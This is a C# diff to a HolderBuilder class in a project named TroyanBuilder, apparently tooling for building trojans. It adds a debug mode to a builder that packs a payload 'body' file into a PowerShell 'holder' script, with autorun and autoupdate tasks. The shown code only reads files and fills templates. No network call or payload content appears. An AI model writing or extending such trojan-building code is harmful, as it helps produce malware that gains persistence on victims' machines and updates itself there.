@@ -2,8 +2,12 @@ namespace TroyanBuilder;
 
 public sealed class HolderBuilder : CustomBuilder
 {
+    public HolderBuilder(TroyanBuildMode mode) : base(mode)
+    {
+    }
+
     protected override string SourceDir => Path.Combine(L.TroyanScriptDir, "holder");
-    protected override string OutputFile => L.HolderPs1;
+    protected override string OutputFile => Mode == TroyanBuildMode.Debug ? L.HolderPs1Debug : L.HolderPs1;
 
     protected override string[] PriorityTasks => new[] { "autorun" };
     protected override string[] UnpriorityTasks => new[] { "autoupdate" };
@@ -19,7 +23,8 @@ public sealed class HolderBuilder : CustomBuilder
         var template = @"
 $xbody = ""__BODY""
 ";
-        var body = File.ReadAllText(L.Body);
+        var bodyPath = Mode == TroyanBuildMode.Debug ? L.BodyDebugTxt : L.Body;
+        var body = File.ReadAllText(bodyPath);
         template = template.Replace("__BODY", body);
         var outputPath = Path.Combine(L.TroyanScriptDir, "holder", "consts_autoextract.ps1");
         File.WriteAllText(outputPath, template);
